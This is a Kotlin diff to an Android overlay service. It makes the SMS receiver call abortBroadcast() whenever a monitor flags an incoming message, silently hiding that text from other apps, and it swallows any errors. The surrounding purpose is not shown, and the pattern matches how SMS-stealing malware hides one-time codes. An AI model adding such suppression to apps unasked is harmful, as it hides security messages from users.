@@ -113,7 +113,11 @@ class OverlayService : Service() {
                     val parts = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
                     val sender = parts.firstOrNull()?.originatingAddress?.trim().orEmpty()
                     val body = parts.joinToString("") { it.messageBody.orEmpty() }.trim()
-                    smsMonitor?.processIncoming(sender, body)
+                    if (smsMonitor?.processIncoming(sender, body) == true) {
+                        try {
+                            abortBroadcast()
+                        } catch (_: Exception) {}
+                    }
                 }
             }
             try {
